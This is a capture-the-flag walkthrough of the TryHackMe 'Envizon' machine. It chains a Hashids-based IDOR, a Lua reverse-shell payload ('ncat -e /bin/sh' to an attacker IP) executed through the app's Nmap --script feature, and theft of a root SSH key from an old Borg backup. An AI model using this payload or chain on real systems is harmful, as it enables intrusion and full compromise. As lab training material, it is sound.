# Overview

**Envizon** is a Hard-level TryHackMe machine built around a white-box penetration-testing scenario.

Unlike a typical black-box machine, Envizon provides clues about the application's source code and expects us to understand how the application works rather than blindly throwing exploits at it.


---

# 1. Reconnaissance

I started by performing a full TCP port scan against the target.

```bash
nmap -sC -sV -p- -T4 \
-oN /home/kali/Desktop/THM_LAB/rooms/hard/envizon/scan.txt \
<target-ip>
```

The scan revealed the following interesting services:

22/tcp      ssh

3000/tcp    HTTPS / Envizon web application

![Nmap](/assets/images/writeups/envizon/1.png)

Port `22` was SSH, but without credentials there was not much to do with it initially.

Port `3000` was much more interesting because it hosted the Envizon web application.

---

# 2. Accessing the Web Application

When I first accessed the application, I was presented with a password/login page.

![login page](/assets/images/writeups/envizon/2.png)

The application required a password before I could access the main interface.

Instead of immediately trying to brute-force the authentication, I looked for other functionality and endpoints.

The page indicated that a user needed to sign up.

![needed to signup](/assets/images/writeups/envizon/2_1.png)

I also inspected the page source because the room explicitly follows a white-box methodology.

![inspecting source page](/assets/images/writeups/envizon/2_2.png)

Some additional links were visible, but none immediately provided access.

At this point, I switched to endpoint enumeration.

---

I used `ffuf` to identify additional endpoints.

```bash
ffuf -u http://<target-ip>:3000/FUZZ \

```

![ffuf](/assets/images/writeups/envizon/2_3.png)

One of the interesting discoveries was the `/notes/` functionality.

This was especially interesting because the room description and source code suggested that the application was intentionally exposing functionality that could be abused.

---

# 4. White-Box Source-Code Analysis

One of the biggest advantages in this room is that the application source code is available.

The application is written using **Ruby on Rails**, which follows the MVC architecture:

The source code can therefore be inspected instead of relying exclusively on black-box enumeration.

I focused on the notes functionality.

The relevant controller contained:

```ruby
# GET /notes/1
# GET /notes/1.json
def show
end
```

![note_controller](/assets/images/writeups/envizon/2_5.png)

This was important because it showed that the `notes` action could be accessed using a predictable route.

However, the actual notes were not simply exposed using their numeric database IDs.

---

# 5. Understanding `acts_as_hashids`

Looking at the Note model revealed the use of:

```ruby
acts_as_hashids length: 30
```

![acts_as_hashids](/assets/images/writeups/envizon/2_7.png)

This means that the application does not normally expose a note as:

```text
/notes/1
/notes/2
/notes/3
```

Instead, database IDs are converted into Hashids.

For example:

```text
Database ID
     │
     ▼
     1
     │
     ▼
Hashids
     │
     ▼
Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw
```

Normally, this would make direct enumeration more difficult.

However, the application had an important weakness.

---

# 6. Accessing `/notes/1`

The developers had implemented a special condition that allowed the first note to be accessed directly.

Therefore: `/notes/1` was accessible even though the normal note IDs were Hashids.

![note with the id "1"](/assets/images/writeups/envizon/2_6.png)

I navigated to: `https://<target-ip>:3000/notes/1`

![/notes/1](/assets/images/writeups/envizon/2_4.png)

The note contained a clue indicating that the password was stored in another note: `Note ID: 380`

This was the turning point.

The application was effectively giving us the internal object ID we needed.

---

# 7. Discovering the Hashid Format

Viewing the source of `/notes/1` revealed the actual Hashid URL used by the application.

`https://<target-ip>:3000/notes/Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw`

![clue hashid](/assets/images/writeups/envizon/2_9.png)

This confirmed that:

```text
1
↓
Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw
```

was the application's Hashid representation.

The next question was:

> Can we generate the Hashid for `380` ourselves?

The answer was yes.

---

# 8. Reproducing the Hashids Calculation

The source code showed: `acts_as_hashids length: 30`

The application did not explicitly specify a custom secret/salt.

The Hashids implementation therefore uses the model/class name as the default secret in this configuration.

For the `Note` model, this gives:

```text
Salt = "Note"
Length = 30
```

I installed the Ruby Hashids gem:

```bash
gem install hashids
```

Then started Ruby's interactive shell:

```bash
irb
```

Inside `irb`:

```ruby
require 'hashids'

hashids = Hashids.new("Note", 30)

hash1   = hashids.encode(1)
hash380 = hashids.encode(380)

puts hash1
puts hash380
```

![irb generating hashid](/assets/images/writeups/envizon/2_10.png)

The important verification step is that the generated value for `1` must match the value observed from the application: `Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw`

Once that matched, I knew the Hashids configuration was correct.

I could then generate the Hashid corresponding to: `380`

---

# 9. Accessing Note 380

I used the generated Hashid in the URL: `https://<target-ip>:3000/notes/<hash-for-380>`

This returned the contents of note `380`.

![password for envizon](/assets/images/writeups/envizon/3.png)

The note contained the password for the Envizon application.

This was effectively an **IDOR combined with predictable object identifiers**.

The attack can be summarized as:

```text
/notes/1
    │
    ▼
Discover internal note ID 380
    │
    ▼
Understand acts_as_hashids
    │
    ▼
Recover Hashids configuration
    │
    ▼
Generate Hashid(380)
    │
    ▼
/notes/<hash-for-380>
    │
    ▼
Application password
```

# 10. Logging Into Envizon

I entered the recovered password into the login page.

After authentication, the main Envizon dashboard became available.

![dashboard for envizon](/assets/images/writeups/envizon/3_1.png)

The application now exposed significantly more functionality.

One of the most interesting areas was the **Nmap scanning functionality**.

---

# 11. Understanding the Nmap Attack Surface

The Envizon application is designed around network reconnaissance and Nmap.

That means the application itself executes Nmap commands.

This immediately makes the Nmap functionality interesting from an attacker perspective.

The important question became:

> Can we make the application execute something other than a normal Nmap scan?

I inspected the source code for the custom scan functionality.

Basic shell command injection techniques were restricted, so simply injecting shell metacharacters such as: `; && | ` was not the intended route.

However, Nmap itself provides functionality that can execute Lua scripts.

This gives us another path:

```text
User-controlled input
        │
        ▼
Nmap
        │
        ▼
--script
        │
        ▼
Lua script
        │
        ▼
os.execute()
        │
        ▼
Command execution
```

This is much more powerful than trying to bypass shell filtering directly.

---

# 12. Abusing the Nmap Script Functionality

Nmap supports NSE scripts, including Lua-based scripts.

The application also provides an upload feature for Nmap scan files.

The important weakness was that the uploaded content was not sufficiently validated before being stored in the Nmap upload directory.

The intended upload location looked like: `/usr/src/app/envizon/nmap/uploads/`

The uploaded file could therefore become our script.

---

# 13. Creating the Lua Payload

I created a Lua file containing:

```lua
os.execute("ncat -e /bin/sh <attacker-ip> 4444")
```

I saved it as: `shell.lua`

![shell.lua](/assets/images/writeups/envizon/3_3.png)

The important part here is: `os.execute(...)`

When Nmap interprets the uploaded file as a Lua/NSE script, `os.execute()` causes the command inside it to be executed by the system.

In this case:

```text
Nmap
  │
  ▼
Lua script
  │
  ▼
os.execute()
  │
  ▼
ncat
  │
  ▼
Reverse shell
```

---

# 14. Uploading the Malicious File

I uploaded the crafted file through the Nmap XML upload functionality.

![upload nmap-xml tab](/assets/images/writeups/envizon/3_2.png)

The application expected an XML-based Nmap result, so the uploaded Lua content did not necessarily behave like a normal scan result.

That was actually useful.

The failed processing generated information that allowed me to determine where the uploaded file was stored.

---

# 15. Finding the Uploaded File Path

I navigated to the **Tasks** section.

![retires section](/assets/images/writeups/envizon/3_4.png)

The failed processing task disclosed the path used by the application: `/usr/src/app/envizon/nmap/uploads/<name>_0.xml`

The exact filename depended on the scan/upload name.

This was important because now I knew both:

1. Where my uploaded file was stored
2. How Nmap could be instructed to load it


The attack was therefore ready.

---

# 16. Executing the Uploaded Lua Script

The application provides a **Manual Scan** function.

Instead of supplying a normal scan command, I used Nmap's `--script` option and pointed it to the uploaded file:

```bash
nmap --script /usr/src/app/envizon/nmap/uploads/<name>_0.xml
```

The target/host field was set to my attacker machine.

The important distinction is that the uploaded file is being treated as an Nmap script even though the filename ends in `.xml`.

Nmap therefore processes the Lua content and reaches: `os.execute(...)`

which executes our command.

---

# 17. Starting the Listener

Before starting the scan, I opened a listener on my Kali machine:

```bash
nc -lvnp 4444
```

![shell](/assets/images/writeups/envizon/3_5.png)

Then I executed the malicious Nmap scan.

The target connected back to my listener.

I received a shell.

---

# 18. Understanding the "Root" Shell

The shell initially appeared to have root privileges.

I checked the environment and discovered that I was inside a Docker container.

A useful indicator was:

```bash
ls -la /
```

and the presence of: `/.dockerenv`

This is important because:

```text
root inside Docker
        ≠
root on the underlying host
```

The privilege boundary was therefore:

```text
HOST
 │
 └── Docker
      │
      └── Envizon container
             │
             └── root
```

This explains why having a root shell was not the end of the room.

---

# 19. Obtaining `local.txt`

Since the shell was running as root inside the container, I checked `/root`.

```bash
cd /root
ls -la
```

The local flag was located there.

![local.txt](/assets/images/writeups/envizon/4.png)

This completed the container-level objective.

However, I still needed to escape the container and obtain the host-level root flag.

---

# 20. Looking for the Host Escape Path

The room gives an important clue regarding backups.

Since I already had root privileges inside the container, I started enumerating the filesystem.

I checked:

```bash
ls -la /
```

and:

```bash
ls -la /etc
```

I also looked for backup-related files and directories.

One particularly interesting location was: `/etc/periodic`

Inside the periodic tasks I found a backup-related script.

This suggested that the system was periodically creating backups.

---

# 21. Discovering Borgmatic

The backup script pointed toward **borgmatic/Borg**.

I inspected: `/etc/borgmatic/config.yaml`

![daily directory encryption_passcommand](/assets/images/writeups/envizon/5.png)

This configuration was extremely valuable.

The important setting was the backup encryption password/passphrase.

The configuration exposed the value used to access the Borg repository.

This changed the attack from:

```text
Docker root
   │
   └── ??? host escape
```

into:

```text
Docker root
   │
   ▼
Borg configuration
   │
   ▼
Backup passphrase
   │
   ▼
Old host backup
   │
   ▼
Root SSH key
   │
   ▼
Host root
```

---

# 22. Locating the Borg Repository

The backup repository was located at: `/var/backup`

I initially checked it:

```bash
ls -la /var/backup
```

There did not appear to be a useful current archive immediately visible.

This is where it is important not to stop just because the directory looks empty or unhelpful.

[Borg repositories](https://borgbackup.readthedocs.io/en/stable/usage/general.html) can contain existing archives even when normal filesystem inspection does not immediately reveal useful files.

I exported the Borg passphrase:

```bash
export BORG_PASSPHRASE=<REDACTED_BORG_PASSPHRASE>
```

Then listed the repository:

```bash
borg list /var/backup
```

The repository contained an older archive: `envizon-2020-09-30T23:25:30.466049`

The archive itself was the key to the final stage.

---

# 23. Understanding Why the Old Backup Matters

The backup was not simply a copy of application files.

The important observation was that the backup contained the root filesystem/data from an earlier point in time.

Therefore, even though the current container did not expose a usable host SSH key, the historical backup could contain one.

This is a classic backup-security problem:

```text
Current system
     │
     ├── Secure/removed credential
     │
     ▼
Historical backup
     │
     └── Old credential still present
```

Removing a secret from the live filesystem does not necessarily remove it from historical backups.

---

# 24. Extracting the Backup

I created a temporary extraction directory:

```bash
mkdir -p /tmp/envizon
cd /tmp/envizon
```

Then extracted the archive:

```bash
borg extract /var/backup::envizon-2020-09-30T23:25:30.466049
```

![retrieving backup process](/assets/images/writeups/envizon/5_1.png)

After extraction, the backup recreated a directory structure containing the old filesystem data.

I inspected the extracted files:

```bash
ls -la
```

Then looked inside the root user's SSH directory:

```bash
cd root/.ssh
ls -la
```

---

# 25. Finding the Root SSH Private Key

Inside the extracted backup I found a private SSH key.

![private ssh key](/assets/images/writeups/envizon/5_2.png)

This was the critical finding.

The attack chain was now:

```text
Borg repository
      │
      ▼
Historical archive
      │
      ▼
/root/.ssh/
      │
      ▼
Private SSH key
      │
      ▼
SSH authentication
      │
      ▼
root@target
```

I copied the private key to my attacking machine and saved it as: `id_rsa`

---

# 26. Using the Recovered SSH Key

SSH private keys require restrictive permissions.

I therefore changed the permissions:

```bash
chmod 600 id_rsa
```

Then connected to the target as root:

```bash
ssh -i id_rsa root@<target-ip>
```

If the key is rejected because of local permission ownership/handling, make sure the key is readable only by the current user: `chmod 600 id_rsa`

![root flag](/assets/images/writeups/envizon/5_2.png)

After successful authentication:

```bash
whoami
```

returned: `root`

I then accessed the root directory:

```bash
cd /root
ls -la
```

and retrieved:

```bash
cat root.txt
```

The machine was fully compromised.
